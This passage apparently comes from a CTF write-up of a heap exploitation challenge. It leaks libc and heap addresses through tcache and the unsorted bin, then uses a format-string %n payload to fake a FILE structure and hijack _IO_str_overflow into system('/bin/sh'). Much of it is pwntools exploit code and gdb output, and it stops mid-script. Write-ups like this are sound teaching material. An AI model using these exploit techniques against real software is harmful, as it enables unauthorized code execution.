</span></code></pre><h3 id=memory-leaks>MEMORY LEAKS</h3><p>We have malloc and we have tcache. That's enough to get libc right? But how?<p>So here's the idea , we allocate 8 chunks , free 8 chunks , now 7 of them go into tcache and one remaining chunk goes into unsorted bin.<p>Now we can add back 7 chunks and consume all tcache , and adding one more will give us our unsorted bin chunk which we can read.<p>Reminding you that we have first 8 bytes on any malloc'd chunk exclusively reserved for <strong>Priority</strong>.<p>In order to get our beloved libc leak , we first need to make sure that all 8 bytes of <strong>Priority</strong> are occupied. This can be achieved by simply giving a size larger than 4 bytes which would trick <strong>cdqe</strong> into thinking it as negetive and thus filling up all 8 bytes of Priority.<p>Wait , what about Heap??<p>If we send two different chunks to unsorted bin , we can get unsorted bin chunks, one of whose bk pointer is heap.<p>Nice , so let's script it a bit.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>   </span><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
</span><span>    </span><span style=color:#ffb454>send_name</span><span>(</span><span style=color:#c2d94c>'aaaaa'</span><span>)
</span><span>
</span><span>    </span><span style=font-style:italic;color:#5c6773>#Initially we allocate 10 chunks
</span><span>    </span><span style=color:#ff7733>for </span><span>i </span><span style=color:#ff7733>in </span><span style=font-style:italic;color:#39bae6>xrange</span><span>(</span><span style=color:#f29718>10</span><span>): 
</span><span>        </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>123</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span>)
</span><span>    
</span><span>    </span><span style=font-style:italic;color:#5c6773>#Then we start filling tcache from 3rd chunk
</span><span>    </span><span style=color:#ff7733>for </span><span>i </span><span style=color:#ff7733>in </span><span style=font-style:italic;color:#39bae6>xrange</span><span>(</span><span style=color:#f29718>3</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>10</span><span>):
</span><span>        </span><span style=color:#ffb454>free</span><span>(i)
</span><span>    </span><span style=font-style:italic;color:#5c6773>#These two chunks go into unsorted bin chunks without merging.
</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)
</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>)
</span><span>    </span><span style=font-style:italic;color:#5c6773>#Now we consume all 7 tcache chunks that we first filled
</span><span>    </span><span style=color:#ff7733>for </span><span>i </span><span style=color:#ff7733>in </span><span style=font-style:italic;color:#39bae6>xrange</span><span>(</span><span style=color:#f29718>7</span><span>):
</span><span>        </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>123123</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'fill_tcache'</span><span>)
</span><span>    </span><span style=font-style:italic;color:#5c6773>#Finally , we get back our unsorted bin chunks whose bk pointers will give heap and libc.
</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#c2d94c>'123456789123'</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span>)
</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#c2d94c>'123456789123'</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span>)
</span><span>    </span><span style=color:#ffb454>view</span><span>(</span><span style=color:#f29718>8</span><span>)
</span><span>    </span><span style=font-style:italic;color:#5c6773>#Libc
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(</span><span style=color:#c2d94c>'Command: '</span><span>)
</span><span>    libc_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x3ebc61
</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"libc_base = " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(libc_base))
</span><span>    one_gadget </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x10a38c
</span><span>    </span><span style=font-style:italic;color:#5c6773>#Heap
</span><span>    </span><span style=color:#ffb454>view</span><span>(</span><span style=color:#f29718>9</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(</span><span style=color:#c2d94c>'Command: '</span><span>)
</span><span>    heap_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x561
</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"heap_base = " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(heap_base))
</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
</span><span>   
</span></code></pre><p>Now that we have the necessary leaks , let us return from our Menu Driven subroutine and execute the rest of the code.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    </span><span style=color:#ffb454>ret</span><span>()
</span></code></pre><p>From here , we need help of our old friend , yes you guessed it right , <strong>gdb</strong>.<p>This is how the file structure created by fopen looks like.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>gdb-peda$ 
</span><span style=color:#ffb454>0x555555758070:</span><span>	0x00000000fbad2c84	0x00005555557582a0 
</span><span style=color:#ffb454>0x555555758080:</span><span>	0x00005555557582a0	0x00005555557582a0
</span><span style=color:#ffb454>0x555555758090:</span><span>	0x00005555557582a0	0x0000555555758439
</span><span style=color:#ffb454>0x5555557580a0:</span><span>	0x00005555557592a0	0x00005555557582a0
</span><span style=color:#ffb454>0x5555557580b0:</span><span>	0x00005555557592a0	0x0000000000000000
</span><span style=color:#ffb454>0x5555557580c0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555557580d0:</span><span>	0x0000000000000000	0x00007ffff7dd0680
</span><span style=color:#ffb454>0x5555557580e0:</span><span>	0x0000000000000003	0x0000000000000000
</span><span style=color:#ffb454>0x5555557580f0:</span><span>	0x0000000000000000	0x0000555555758150
</span><span style=color:#ffb454>0x555555758100:</span><span>	0xffffffffffffffff	0x0000000000000000
</span><span style=color:#ffb454>0x555555758110:</span><span>	0x0000555555758160	0x0000000000000000
</span><span style=color:#ffb454>0x555555758120:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758130:</span><span>	0x00000000ffffffff	0x0000000000000000
</span><span style=color:#ffb454>0x555555758140:</span><span>	0x0000000000000000	0x00007ffff7dcc2a0
</span><span style=color:#ffb454>0x555555758150:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758160:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758170:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758180:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758190:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555557581a0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555557581b0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555557581c0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555557581d0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555557581e0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555557581f0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758200:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758210:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758220:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758230:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758240:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758250:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758260:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758270:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758280:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555758290:</span><span>	0x00007ffff7dcbd60 -</span><span style=color:#f29668>></span><span> vtable	0x0000000000001011
</span><span style=color:#ffb454>0x5555557582a0:</span><span>	0x37343132203a6449	0x2d0a393935313834 -</span><span style=color:#f29668>></span><span> all of user data
</span><span>
</span></code></pre><p>Also , let us analyze stack at the instance of triggering the format string bug.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span>
</span><span style=color:#ffb454>0000</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffec90</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7fffffffecf0 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555758070 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xfbad2c84 -</span><span style=color:#f29668>></span><span> Interestingly , the pointer to file structure is also stored here. 
</span><span style=color:#ffb454>0008</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffec98</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7fffffffed00 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0016</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffeca0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa55756080 
</span><span style=color:#ffb454>0024</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffeca8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7ff 
</span><span style=color:#ffb454>0032</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffecb0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x666564636261 (</span><span style=color:#c2d94c>'abcdef'</span><span>) </span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> our input buf
</span><span style=color:#ffb454>0040</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffecb8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0048</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffecc0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x202e724d (</span><span style=color:#c2d94c>'Mr. '</span><span>)
</span><span style=color:#ffb454>0056</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffecc8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0064</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffecd0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7fff00000000 
</span><span style=color:#ffb454>0072</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffecd8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x2c18ea94720bb00 
</span><span style=color:#ffb454>0080</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffece0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7fffffffed60 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555555530 (push   r15)
</span><span style=color:#ffb454>0088</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffece8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555555500 (mov    rax,QWORD PTR </span><span style=color:#ff7733>[</span><span>rbp</span><span style=color:#ff7733>-</span><span>0x70</span><span style=color:#ff7733>]</span><span>)
</span><span style=color:#ffb454>0096</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffecf0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555758070 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xfbad2c84
</span><span style=color:#ffb454>0104</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffecf8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x6 
</span><span style=color:#ffb454>0112</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed00</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0120</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed08</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0128</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed10</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0136</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed18</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0144</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed20</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0152</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed28</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0160</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed30</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0168</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed38</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555757d50 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xffffffffbe991a83 
</span><span style=color:#ffb454>0176</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed40</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555757ee0 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x3039 (</span><span style=color:#c2d94c>'90'</span><span>)
</span><span style=color:#ffb454>0184</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed48</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0192</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed50</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7fffffffee40 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0208</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed60</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555555530 (push   r15)
</span><span style=color:#ffb454>0216</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffed68</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7a05b97 (</span><span style=color:#f29668><</span><span>__libc_start_main+231</span><span style=color:#f29668>></span><span>:	mov    edi,eax) </span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> The good old libc_start_main
</span><span>
</span></code></pre><p>We observe that the very first offset of stack at the instance of format string being triggered is <strong>pointer to the file structure</strong>.<p>So, we can directly use our old friend <strong>%n</strong> to completely fake the file structure. {: .notice}<p>We can fake the file pointer to any of our allocated chunks.<p>It's time to craft our format string payload.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>payload </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'</span><span style=color:#f29718>%32896c</span><span style=color:#c2d94c>' </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'%4$hn'
</span><span>
</span></code></pre><p>We send the payload instead of name in the very beginning of our exploit.<p>And now , after triggering the format string , we overwrite the file structure with our fake structure.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>0000</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffec90</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7fffffffecf0 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555758200 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xfbad2c84 -</span><span style=color:#f29668>></span><span> Before triggering format string
</span><span style=color:#ffb454>0008</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffec98</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7fffffffed00 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555758070 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1e0f3 
</span><span style=color:#ffb454>0016</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffeca0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa55756080 
</span><span style=color:#ffb454>0024</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffeca8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x4d1 
</span><span style=color:#ffb454>0032</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffecb0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span>
</span><span style=color:#ffb454>-------x-----------x---------x----------x----------x
</span><span>
</span><span style=color:#ffb454>0000</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffec90</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7fffffffecf0 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555758080 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x656863 (</span><span style=color:#c2d94c>'che'</span><span>) </span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> We overwrote it yaaay!
</span><span style=color:#ffb454>0008</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffec98</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7fffffffed00 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555758070 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1e0f3
</span><span style=color:#ffb454>0016</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffeca0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa55756080
</span><span style=color:#ffb454>0024</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7fffffffeca8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x4d1
</span><span>
</span></code></pre><p>We fake the file struture somewhere close to our original file structure as we dont have leaks initially. We are doing this because the last 3 nibbles of any memory region are not effected by <strong>ASLR</strong> and hence we overwrite only the last 2 bytes of our original file structure to point it to our fake file structure.<p>Let us craft our file structure.<p>Here we are going to bypass vtable check by corrupting the value of vtable inorder to trigger <em>_IO_str_overflow</em>.<p>Before crafting our file structure , let us try to understand how we trigger control flow with <em>IO_str_overflow</em>.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ffb454>_IO_str_overflow </span><span>(_IO_FILE </span><span style=color:#f29668>*</span><span>fp</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>int</span><span> c)
</span><span>{
</span><span>  </span><span style=color:#ff7733>int</span><span> flush_only </span><span style=color:#f29668>=</span><span> c </span><span style=color:#f29668>==</span><span> EOF</span><span style=color:#bfbab0cc>;
</span><span>  _IO_size_t pos</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>(fp</span><span style=color:#f29668>-></span><span>_flags </span><span style=color:#f29668>&</span><span> _IO_NO_WRITES)
</span><span>      </span><span style=color:#ff7733>return</span><span> flush_only </span><span style=color:#f29668>? </span><span style=color:#f29718>0 </span><span style=color:#f29668>:</span><span> EOF</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>((fp</span><span style=color:#f29668>-></span><span>_flags </span><span style=color:#f29668>&</span><span> _IO_TIED_PUT_GET) </span><span style=color:#f29668>&& !</span><span>(fp</span><span style=color:#f29668>-></span><span>_flags </span><span style=color:#f29668>&</span><span> _IO_CURRENTLY_PUTTING))
</span><span>    {
</span><span>      fp</span><span style=color:#f29668>-></span><span>_flags </span><span style=color:#f29668>|=</span><span> _IO_CURRENTLY_PUTTING</span><span style=color:#bfbab0cc>;
</span><span>      fp</span><span style=color:#f29668>-></span><span>_IO_write_ptr </span><span style=color:#f29668>=</span><span> fp</span><span style=color:#f29668>-></span><span>_IO_read_ptr</span><span style=color:#bfbab0cc>;
</span><span>      fp</span><span style=color:#f29668>-></span><span>_IO_read_ptr </span><span style=color:#f29668>=</span><span> fp</span><span style=color:#f29668>-></span><span>_IO_read_end</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>  pos </span><span style=color:#f29668>=</span><span> fp</span><span style=color:#f29668>-></span><span>_IO_write_ptr </span><span style=color:#f29668>-</span><span> fp</span><span style=color:#f29668>-></span><span>_IO_write_base</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>(pos </span><span style=color:#f29668>>= </span><span>(_IO_size_t) (</span><span style=color:#ffb454>_IO_blen </span><span>(fp) </span><span style=color:#f29668>+</span><span> flush_only))
</span><span>    {
</span><span>      </span><span style=color:#ff7733>if </span><span>(fp</span><span style=color:#f29668>-></span><span>_flags </span><span style=color:#f29668>&</span><span> _IO_USER_BUF) </span><span style=font-style:italic;color:#5c6773>/* not allowed to enlarge */
</span><span>        </span><span style=color:#ff7733>return</span><span> EOF</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#ff7733>else
</span><span>    {
</span><span>      </span><span style=color:#ff7733>char </span><span style=color:#f29668>*</span><span>new_buf</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#ff7733>char </span><span style=color:#f29668>*</span><span>old_buf </span><span style=color:#f29668>=</span><span> fp</span><span style=color:#f29668>-></span><span>_IO_buf_base</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=font-style:italic;color:#39bae6>size_t</span><span> old_blen </span><span style=color:#f29668>= </span><span style=color:#ffb454>_IO_blen </span><span>(fp)</span><span style=color:#bfbab0cc>;
</span><span>      _IO_size_t new_size </span><span style=color:#f29668>= </span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> old_blen </span><span style=color:#f29668>+ </span><span style=color:#f29718>100</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#ff7733>if </span><span>(new_size </span><span style=color:#f29668><</span><span> old_blen)
</span><span>        </span><span style=color:#ff7733>return</span><span> EOF</span><span style=color:#bfbab0cc>;
</span><span>      new_buf </span><span style=color:#f29668>= </span><span>(</span><span style=color:#ff7733>char </span><span style=color:#f29668>*</span><span>) (</span><span style=color:#f29668>*</span><span>((_IO_strfile </span><span style=color:#f29668>*</span><span>) fp)</span><span style=color:#f29668>-></span><span>_s</span><span style=color:#f29668>.</span><span>_allocate_buffer) (new_size)</span><span style=color:#bfbab0cc>;
</span><span>
</span></code></pre><p>By corrupting certain pointers of file structure , we can redirect the control flow to call<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>    new_buf </span><span style=color:#f29668>= </span><span>(</span><span style=color:#ff7733>char </span><span style=color:#f29668>*</span><span>) (</span><span style=color:#f29668>*</span><span>((_IO_strfile </span><span style=color:#f29668>*</span><span>) fp)</span><span style=color:#f29668>-></span><span>_s</span><span style=color:#f29668>.</span><span>_allocate_buffer) (new_size)</span><span style=color:#bfbab0cc>;
</span></code></pre><p>It can be observed from the source code that -><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>    _IO_size_t new_size </span><span style=color:#f29668>= </span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> old_blen </span><span style=color:#f29668>+ </span><span style=color:#f29718>100</span><span style=color:#bfbab0cc>;
</span></code></pre><p>Where <em>old_blen</em> is defined as -><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>
</span><span>old_blen </span><span style=color:#f29668>=</span><span> fp</span><span style=color:#f29668>-></span><span>_IO_buf_end </span><span style=color:#f29668>-</span><span> fp</span><span style=color:#f29668>-></span><span>_IO_buf_base
</span><span>
</span></code></pre><p>So , if we set <em>IO_buf_base</em> to 0 , and <em>_IO_buf_end</em> to <em>(binsh_ptr-100)/2</em> ,then <em>new_size</em> which is the first argument of <em>IO_strfile</em> function will be pointer to <strong>/bin/sh</strong>.<p>But wait , we have one more restriction before getting control flow.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  pos </span><span style=color:#f29668>=</span><span> fp</span><span style=color:#f29668>-></span><span>_IO_write_ptr </span><span style=color:#f29668>-</span><span> fp</span><span style=color:#f29668>-></span><span>_IO_write_base</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>(pos </span><span style=color:#f29668>>= </span><span>(_IO_size_t) (</span><span style=color:#ffb454>_IO_blen </span><span>(fp) </span><span style=color:#f29668>+</span><span> flush_only))
</span><span>  {
</span><span>    </span><span style=font-style:italic;color:#5c6773>// enter target condition
</span><span>  }
</span></code></pre><p><em>flush_only</em> is 0, so we want <em>pos >= _IO_blen(fp)</em>.<p>This can be achieved by setting <em>_IO_write_ptr = (binsh - 100)/2</em> and <em>_IO_write_base = 0</em>.<p>Let's nicely recall what all need to go ahead now<ol><li>set <em>IO_buf_base</em> to 0.<li>set <em>IO_buf_end</em> to <em>(binsh-100)/2</em><li>set <em>IO_write_ptr</em> to <em>(binsh-100)/2</em><li>set <em>IO_write_base</em> to 0<li>set vtable to <em>IO_str_overflow-0x10</em></ol><pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=font-style:italic;color:#5c6773># We free this chunk and allocate it back as it is closest to our original file structure
</span><span>
</span><span>    binsh </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span>LIBC</span><span style=color:#f29668>.</span><span style=color:#ffb454>search</span><span>(</span><span style=color:#c2d94c>'/bin/sh</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span>)</span><span style=color:#f29668>.</span><span style=color:#ffb454>next</span><span>()  
</span><span>    system </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span>LIBC</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'system'</span><span>]
</span><span>    io_str_overflow_ptr_addr </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span>LIBC</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'_IO_file_jumps'</span><span>] </span><span style=color:#f29668>+ </span><span style=color:#f29718>0xd8
</span><span>
</span><span>    </span><span style=font-style:italic;color:#5c6773>#Fake File Structure
</span><span>    fake_vtable </span><span style=color:#f29668>= </span><span>io_str_overflow_ptr_addr </span><span style=color:#f29668>- </span><span style=color:#f29718>2</span><span style=color:#f29668>*</span><span style=color:#f29718>8
</span><span>    fake_file_str </span><span style=color:#f29668>= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0xfbad1800</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(heap_base</span><span style=color:#f29668>+</span><span style=color:#f29718>0x1430</span><span>)</span><span style=color:#f29668>*</span><span style=color:#f29718>3
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>((binsh</span><span style=color:#f29668>-</span><span style=color:#f29718>100</span><span>)</span><span style=color:#f29668>/</span><span style=color:#f29718>2</span><span style=color:#f29668>+</span><span style=color:#f29718>1</span><span>)  </span><span style=font-style:italic;color:#5c6773>#IO_write_ptr
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1430</span><span>)
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=font-style:italic;color:#5c6773>#IO_buf_base
